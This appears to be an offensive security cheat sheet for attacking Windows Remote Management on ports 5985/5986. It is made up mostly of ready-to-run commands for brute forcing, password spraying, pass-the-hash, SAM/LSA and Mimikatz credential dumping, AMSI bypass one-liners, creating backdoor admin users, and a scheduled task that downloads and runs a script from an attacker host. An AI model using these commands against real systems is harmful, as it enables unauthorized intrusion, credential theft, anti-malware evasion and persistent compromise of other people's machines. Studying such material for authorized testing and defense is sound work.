# WINRM ENUMERATION (Port 5985/5986)

## PORT OVERVIEW
```
Port 5985 - WinRM HTTP
Port 5986 - WinRM HTTPS
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p5985,5986 <IP>                       # Service/Version detection
nc -nv <IP> 5985                                # Manual connection
curl -i http://<IP>:5985/wsman                  # HTTP request
```

## NMAP WINRM ENUMERATION
```bash
nmap --script "http-*" -p5985 <IP>              # HTTP scripts
nmap --script http-auth -p5985 <IP>             # Authentication methods
nmap --script http-enum -p5985 <IP>             # Enumerate paths
nmap --script ssl-enum-ciphers -p5986 <IP>      # SSL/TLS ciphers (HTTPS)
```

## CHECK IF WINRM IS ENABLED
```bash
# Test if WinRM is accessible
curl http://<IP>:5985/wsman                     # HTTP
curl https://<IP>:5986/wsman -k                 # HTTPS

# Response should contain "wsmv.xsd" if WinRM is enabled

# Nmap NSE script
nmap -p5985 --script http-auth <IP>

# Evil-WinRM
evil-winrm -i <IP> -u <USER> -p <PASSWORD>      # Test connection
```

## AUTHENTICATION TESTING
```bash
# Test for valid credentials
evil-winrm -i <IP> -u administrator -p password
evil-winrm -i <IP> -u <USER> -p <PASSWORD>

# Common default credentials
administrator:password
administrator:Password1
administrator:P@ssw0rd
administrator:Admin123
admin:password
```

## EVIL-WINRM (PRIMARY TOOL)
```bash
# Evil-WinRM is the best tool for WinRM exploitation
# Install: gem install evil-winrm

# Connect with password
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
evil-winrm -i <IP> -u administrator -p 'Password123!'

# Connect with NTLM hash (pass-the-hash)
evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>
evil-winrm -i <IP> -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'

# Connect via HTTPS (port 5986)
evil-winrm -i <IP> -u <USER> -p <PASSWORD> -S
evil-winrm -i <IP> -u <USER> -p <PASSWORD> -P 5986 -S

# Connect with SSL and skip certificate verification
evil-winrm -i <IP> -u <USER> -p <PASSWORD> -S -s

# Commands within Evil-WinRM
*Evil-WinRM* PS C:\Users\user> whoami
*Evil-WinRM* PS C:\Users\user> upload /path/to/local/file C:\path\to\remote\file
*Evil-WinRM* PS C:\Users\user> download C:\path\to\remote\file /path/to/local/file
*Evil-WinRM* PS C:\Users\user> menu                 # Show commands
*Evil-WinRM* PS C:\Users\user> Bypass-4MSI          # Bypass AMSI
*Evil-WinRM* PS C:\Users\user> Invoke-Binary /path/to/binary.exe  # Execute binary in memory
```

## CRACKMAPEXEC (WINRM MODULE)
```bash
# CrackMapExec supports WinRM
crackmapexec winrm <IP> -u <USER> -p <PASSWORD>     # Single credential
crackmapexec winrm <IP> -u users.txt -p passwords.txt  # Spray/brute force
crackmapexec winrm <IP> -u <USER> -H <NTLM_HASH>    # Pass-the-hash

# Execute commands
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> -x whoami  # CMD command
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> -X '$PSVersionTable'  # PowerShell

# Enumerate shares, users, etc.
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> --shares
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> --sam  # Dump SAM
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> --lsa  # Dump LSA secrets
```

## METASPLOIT WINRM MODULES
```bash
msfconsole
use auxiliary/scanner/winrm/winrm_auth_methods  # Enumerate auth methods
use auxiliary/scanner/winrm/winrm_login         # Login scanner
use auxiliary/scanner/winrm/winrm_cmd           # Execute command
use exploit/windows/winrm/winrm_script_exec     # Script execution

# Example: Execute command
set RHOSTS <IP>
set USERNAME administrator
set PASSWORD password
set CMD whoami
run
```

## RUBY WINRM (WINRM GEM)
```bash
# Install WinRM gem
gem install winrm winrm-fs

# Ruby script to connect
ruby -rwinrm -e "conn = WinRM::Connection.new(endpoint: 'http://<IP>:5985/wsman', user: '<USER>', password: '<PASSWORD>'); command = conn.shell(:powershell).run('whoami'); puts command.stdout"

# Execute PowerShell command
ruby -rwinrm -e "conn = WinRM::Connection.new(endpoint: 'http://<IP>:5985/wsman', user: '<USER>', password: '<PASSWORD>'); command = conn.shell(:powershell).run('Get-Process'); puts command.stdout"
```

## BRUTE FORCE ATTACKS
```bash
# CrackMapExec brute force
crackmapexec winrm <IP> -u users.txt -p passwords.txt  # Brute force
crackmapexec winrm <IP> -u administrator -p passwords.txt  # Single user

# Hydra (limited support)
hydra -l administrator -P passwords.txt <IP> winrm

# Metasploit
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <IP>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## PASSWORD SPRAYING
```bash
# Password spray via CrackMapExec
crackmapexec winrm <IP_RANGE> -u users.txt -p 'Password123!' --continue-on-success

# Avoid account lockout
for user in $(cat users.txt); do
  crackmapexec winrm <IP> -u $user -p 'Password123!'
  sleep 5
done
```

## PASS-THE-HASH (PTH)
```bash
# Evil-WinRM with NTLM hash
evil-winrm -i <IP> -u <USER> -H <NTLM_HASH>
evil-winrm -i <IP> -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'

# CrackMapExec with hash
crackmapexec winrm <IP> -u <USER> -H <NTLM_HASH>
crackmapexec winrm <IP> -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6'

# Impacket wmiexec (alternative, uses WMI not WinRM)
impacket-wmiexec -hashes :<NTLM_HASH> <USER>@<IP>
```

## COMMAND EXECUTION
```bash
# Evil-WinRM (interactive shell)
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
*Evil-WinRM* PS C:\> whoami
*Evil-WinRM* PS C:\> ipconfig
*Evil-WinRM* PS C:\> net user

# CrackMapExec (single command)
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> -x whoami  # CMD
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> -X 'Get-Process'  # PowerShell

# Metasploit
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS <IP>
set USERNAME <USER>
set PASSWORD <PASSWORD>
set CMD whoami
run
```

## FILE UPLOAD/DOWNLOAD
```bash
# Evil-WinRM upload
*Evil-WinRM* PS C:\> upload /path/to/local/file.exe C:\Windows\Temp\file.exe

# Evil-WinRM download
*Evil-WinRM* PS C:\> download C:\Users\user\Documents\file.txt /tmp/file.txt

# PowerShell download via WinRM
powershell -c "Invoke-WebRequest -Uri http://<attacker>/file.exe -OutFile C:\Windows\Temp\file.exe"

# CrackMapExec doesn't support file transfer directly
# Use SMB shares or PowerShell download instead
```

## ENUMERATE SYSTEM INFORMATION
```bash
# Via Evil-WinRM
*Evil-WinRM* PS C:\> systeminfo
*Evil-WinRM* PS C:\> Get-ComputerInfo
*Evil-WinRM* PS C:\> whoami /all
*Evil-WinRM* PS C:\> net user
*Evil-WinRM* PS C:\> net localgroup administrators

# Via CrackMapExec
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> -X 'systeminfo'
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> -X 'Get-ComputerInfo'
```

## ENUMERATE USERS
```bash
# Local users
*Evil-WinRM* PS C:\> net user
*Evil-WinRM* PS C:\> Get-LocalUser

# Domain users (if domain-joined)
*Evil-WinRM* PS C:\> net user /domain
*Evil-WinRM* PS C:\> Get-ADUser -Filter *

# User details
*Evil-WinRM* PS C:\> net user <username>
*Evil-WinRM* PS C:\> whoami /all
```

## ENUMERATE GROUPS
```bash
# Local groups
*Evil-WinRM* PS C:\> net localgroup
*Evil-WinRM* PS C:\> Get-LocalGroup

# Administrators
*Evil-WinRM* PS C:\> net localgroup administrators
*Evil-WinRM* PS C:\> Get-LocalGroupMember -Group "Administrators"

# Domain groups (if domain-joined)
*Evil-WinRM* PS C:\> net group /domain
*Evil-WinRM* PS C:\> Get-ADGroup -Filter *
```

## PRIVILEGE ESCALATION
```bash
# Check current privileges
*Evil-WinRM* PS C:\> whoami /priv
*Evil-WinRM* PS C:\> whoami /groups

# Common privilege escalation vectors via WinRM:
# - SeImpersonatePrivilege (Potato exploits)
# - SeBackupPrivilege (backup SAM/SYSTEM)
# - Unquoted service paths
# - AlwaysInstallElevated

# Upload and run WinPEAS
*Evil-WinRM* PS C:\> upload /path/to/winPEASx64.exe C:\Windows\Temp\winPEAS.exe
*Evil-WinRM* PS C:\> C:\Windows\Temp\winPEAS.exe

# Check AlwaysInstallElevated
*Evil-WinRM* PS C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
*Evil-WinRM* PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## DUMP CREDENTIALS
```bash
# CrackMapExec SAM dump
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> --sam

# CrackMapExec LSA dump
crackmapexec winrm <IP> -u <USER> -p <PASSWORD> --lsa

# Mimikatz via Evil-WinRM
*Evil-WinRM* PS C:\> upload /path/to/mimikatz.exe C:\Windows\Temp\mimikatz.exe
*Evil-WinRM* PS C:\> C:\Windows\Temp\mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# PowerShell Invoke-Mimikatz
*Evil-WinRM* PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-Mimikatz.ps1')
*Evil-WinRM* PS C:\> Invoke-Mimikatz -DumpCreds
```

## PERSISTENCE
```bash
# Create backdoor user
*Evil-WinRM* PS C:\> net user backdoor Password123! /add
*Evil-WinRM* PS C:\> net localgroup administrators backdoor /add

# Enable RDP
*Evil-WinRM* PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
*Evil-WinRM* PS C:\> netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Scheduled task persistence
*Evil-WinRM* PS C:\> schtasks /create /tn "Backdoor" /tr "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/shell.ps1')" /sc onlogon /ru SYSTEM
```

## BYPASS AMSI (ANTI-MALWARE SCAN INTERFACE)
```bash
# Evil-WinRM built-in AMSI bypass
*Evil-WinRM* PS C:\> Bypass-4MSI

# Manual AMSI bypass (PowerShell)
*Evil-WinRM* PS C:\> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative AMSI bypass
*Evil-WinRM* PS C:\> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$f.SetValue($null,[IntPtr]0)
```

## LATERAL MOVEMENT
```bash
# WinRM allows easy lateral movement to other hosts
evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>

# Password spray across network
crackmapexec winrm 192.168.1.0/24 -u administrator -p 'Password123!'

# Pass-the-hash across network
crackmapexec winrm 192.168.1.0/24 -u administrator -H <NTLM_HASH>
```

## KERBEROS AUTHENTICATION
```bash
# Evil-WinRM with Kerberos (requires krb5 configuration)
evil-winrm -i <IP> -r <REALM> -u <USER> -p <PASSWORD>

# Pass-the-ticket (requires ticket cache)
export KRB5CCNAME=/path/to/ticket.ccache
evil-winrm -i <HOSTNAME>.<DOMAIN> -r <REALM>
```

## COMMON MISCONFIGURATIONS
```
☐ WinRM enabled and accessible from internet
☐ Default credentials (administrator:password)
☐ Weak passwords (brute-forceable)
☐ WinRM over HTTP (unencrypted, port 5985)
☐ No firewall rules restricting WinRM access
☐ AllowUnencrypted set to true
☐ No account lockout policy
☐ WinRM accessible from low-trust networks
☐ Overly permissive WinRM access (non-admins)
☐ NTLM authentication enabled (relay attacks possible)
```

## QUICK WIN CHECKLIST
```
☐ Test for default credentials (administrator:password)
☐ Brute force weak passwords
☐ Test for pass-the-hash vulnerability
☐ Check if accessible via HTTP (port 5985)
☐ Enumerate local users and groups
☐ Check for privilege escalation vectors (SeImpersonatePrivilege)
☐ Dump SAM/LSA secrets
☐ Upload and run enumeration tools (WinPEAS)
☐ Check for other accessible hosts (lateral movement)
☐ Create persistence (backdoor user, scheduled task)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick WinRM enumeration
nmap -sV -p5985,5986 <IP>

# With credentials
evil-winrm -i <IP> -u administrator -p password
crackmapexec winrm <IP> -u administrator -p password --sam --lsa

# Password spray
crackmapexec winrm 192.168.1.0/24 -u users.txt -p 'Password123!' --continue-on-success
```

## ADVANCED TECHNIQUES
```bash
# WinRM session hijacking
# If you have admin rights, you can attach to existing sessions

# WinRM over Tor/proxychains (for anonymity)
proxychains evil-winrm -i <IP> -u <USER> -p <PASSWORD>

# WinRM constrained delegation abuse
# If user has constrained delegation configured

# WinRM + NTLM relay
# Relay NTLM auth from WinRM to other services

# WinRM tunneling for pivot
# Use WinRM as SOCKS proxy to access internal network
```

## POST-EXPLOITATION (AFTER WINRM ACCESS)
```bash
# After gaining WinRM access:
1. Enumerate system information (OS, architecture, patches)
2. Check current user privileges
3. Enumerate local users and groups
4. Dump SAM/LSA secrets (if admin)
5. Search for sensitive files (credentials, configs)
6. Check for privilege escalation vectors
7. Upload and run enumeration tools (WinPEAS, SharpUp)
8. Dump credentials from memory (Mimikatz)
9. Lateral movement to other hosts
10. Create persistence (backdoor user, scheduled tasks)
11. Exfiltrate data

# Quick enumeration script
*Evil-WinRM* PS C:\> systeminfo
*Evil-WinRM* PS C:\> whoami /all
*Evil-WinRM* PS C:\> net user
*Evil-WinRM* PS C:\> net localgroup administrators
*Evil-WinRM* PS C:\> ipconfig /all
*Evil-WinRM* PS C:\> route print
*Evil-WinRM* PS C:\> netstat -ano
```

## ENABLE WINRM (POST-COMPROMISE)
```bash
# If WinRM is not enabled, enable it (requires admin)
# Via RDP, SMB, or other access

# PowerShell (run as admin)
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value * -Force
Set-Item WSMan:\localhost\Service\AllowUnencrypted -Value $true -Force

# CMD (run as admin)
winrm quickconfig -q
winrm set winrm/config/client @{TrustedHosts="*"}
winrm set winrm/config/service @{AllowUnencrypted="true"}

# Firewall rule
netsh advfirewall firewall add rule name="WinRM HTTP" dir=in action=allow protocol=TCP localport=5985
```
